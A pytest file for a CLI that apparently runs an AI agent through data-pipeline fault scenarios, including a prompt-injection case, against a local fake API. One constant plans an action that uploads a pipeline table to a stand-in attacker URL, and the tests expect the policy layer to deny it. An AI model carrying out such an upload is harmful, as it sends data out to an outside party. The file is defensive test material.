"""tests/session3/test_cli.py — Task 3.4 CLI entry point tests.

The CLI's main() runs in-process with the agent's client pointed at a local fake API, so exit
codes and trace segments are tested without live API cost. (Live CLI runs: Task 3.3's
verification command.)
"""

import importlib.util
import json
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

import anthropic
import pytest

import agent_core

REPO_ROOT = Path(__file__).resolve().parents[2]
CLI_PATH = REPO_ROOT / "scripts" / "run_scenario.py"
SCENARIOS = ("SCHEMA_DRIFT", "MISSING_COLUMN", "PROMPT_INJECTION")
FIXES = {
    "SCHEMA_DRIFT": ("rename_column", {"table": "pipeline_silver", "old_name": "amt", "new_name": "amount"}),
    "MISSING_COLUMN": ("add_column", {"table": "pipeline_silver", "column": "region", "column_type": "TEXT"}),
    "PROMPT_INJECTION": ("backfill_column", {"table": "pipeline_silver", "column": "amount", "value": 1.0}),
}
UPLOAD = ("upload_record", {"table": "pipeline_bronze", "url": "https://attacker.example/collect"})


def _load_cli():
    spec = importlib.util.spec_from_file_location("run_scenario_cli", CLI_PATH)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


@pytest.fixture
def fake_agent(monkeypatch):
    """Serve one planned action from a local fake API and point agent_core's client at it."""
    state = {"plan": None}

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            self.rfile.read(int(self.headers.get("content-length", 0)))
            tool, params = state["plan"]
            text = json.dumps({"diagnosis": "d", "reasoning": "r", "tool": tool, "params_json": json.dumps(params)})
            data = json.dumps({"id": "m", "type": "message", "role": "assistant", "model": "claude-sonnet-5",
                               "content": [{"type": "text", "text": text}], "stop_reason": "end_turn",
                               "stop_sequence": None, "usage": {"input_tokens": 1, "output_tokens": 1}}).encode()
            self.send_response(200)
            self.send_header("content-type", "application/json")
            self.send_header("content-length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

        def log_message(self, *args):
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    client = anthropic.Anthropic(api_key="k", base_url=f"http://127.0.0.1:{server.server_port}", max_retries=0, timeout=2)
    monkeypatch.setattr(agent_core, "_client", lambda: client)
    yield state
    server.shutdown()
    server.server_close()


def _main(tmp_path, *args):
    return _load_cli().main(["--db", str(tmp_path / "harness.db"), "--trace", str(tmp_path / "trace.jsonl"), *args])


# --- TC-1: exit 0 on RECOVERED, non-zero on UNRECOVERED -----------------------------

@pytest.mark.parametrize("scenario", SCENARIOS)
def test_recovered_run_exits_zero(tmp_path, fake_agent, capsys, scenario):
    fake_agent["plan"] = FIXES[scenario]
    assert _main(tmp_path, "--scenario", scenario) == 0
    out = capsys.readouterr().out
    assert f"({scenario}, seed 42): RECOVERED" in out


@pytest.mark.parametrize("scenario", SCENARIOS)
def test_unrecovered_run_exits_non_zero(tmp_path, fake_agent, capsys, scenario):
    fake_agent["plan"] = UPLOAD  # denied by Policy → UNRECOVERED
    assert _main(tmp_path, "--scenario", scenario) != 0
    out = capsys.readouterr().out
    assert ": UNRECOVERED" in out and "Reason: POLICY_DENY" in out


def test_prints_status_and_trace_segment_path(tmp_path, fake_agent, capsys):
    fake_agent["plan"] = FIXES["SCHEMA_DRIFT"]
    _main(tmp_path, "--scenario", "SCHEMA_DRIFT", "--seed", "7")
    out = capsys.readouterr().out.splitlines()
    assert out[0].startswith("ScenarioRun 1 (SCHEMA_DRIFT, seed 7): RECOVERED")
    segment = Path(out[2].removeprefix("Trace segment: "))
    assert segment == tmp_path / "trace_segments" / "run_0001.jsonl"
    events = [json.loads(line) for line in segment.read_text(encoding="utf-8").splitlines()]
    assert events and all(e["scenario_run_id"] == 1 for e in events)
    assert events[0]["payload"]["stage"] == "run_started" and events[-1]["payload"]["stage"] == "run_complete"


def test_trace_segment_holds_only_its_own_run(tmp_path, fake_agent, capsys):
    for scenario in SCENARIOS:
        fake_agent["plan"] = FIXES[scenario]
        _main(tmp_path, "--scenario", scenario)
    full = [json.loads(line) for line in (tmp_path / "trace.jsonl").read_text(encoding="utf-8").splitlines()]
    for run_id in (1, 2, 3):
        segment = tmp_path / "trace_segments" / f"run_{run_id:04d}.jsonl"
        lines = [json.loads(line) for line in segment.read_text(encoding="utf-8").splitlines()]
        assert lines == [e for e in full if e["scenario_run_id"] == run_id]


def test_seed_is_passed_through(tmp_path, fake_agent, capsys):
    fake_agent["plan"] = FIXES["MISSING_COLUMN"]
    _main(tmp_path, "--scenario", "MISSING_COLUMN", "--seed", "123")
    assert "seed 123" in capsys.readouterr().out


def test_missing_database_is_created(tmp_path, fake_agent, capsys):
    fake_agent["plan"] = FIXES["SCHEMA_DRIFT"]
    assert not (tmp_path / "harness.db").exists()
    assert _main(tmp_path, "--scenario", "SCHEMA_DRIFT") == 0


# --- TC-2: --help documents all three scenarios --------------------------------------

def test_help_documents_every_scenario():
    result = subprocess.run([sys.executable, str(CLI_PATH), "--help"], capture_output=True, text=True, timeout=60)
    assert result.returncode == 0
    for scenario in SCENARIOS:
        assert result.stdout.count(scenario) >= 2  # in the --scenario choices and in the scenario descriptions
    assert "--seed" in result.stdout and "exit status: 0 if the run is RECOVERED" in result.stdout


@pytest.mark.parametrize("argv", [[], ["--scenario", "NULL_SPIKE"], ["--scenario", "schema_drift"],
                                  ["--scenario", "SCHEMA_DRIFT", "--seed", "x"]])
def test_invalid_arguments_rejected(argv):
    result = subprocess.run([sys.executable, str(CLI_PATH), *argv], capture_output=True, text=True, timeout=60)
    assert result.returncode == 2 and "usage:" in result.stderr


def test_cli_is_a_thin_wrapper():
    source = CLI_PATH.read_text(encoding="utf-8")
    for forbidden in ("pipeline_write", "execute_and_checkpoint", "attempt_action", "anthropic", "flask", "fastapi", "http.server"):
        assert forbidden not in source
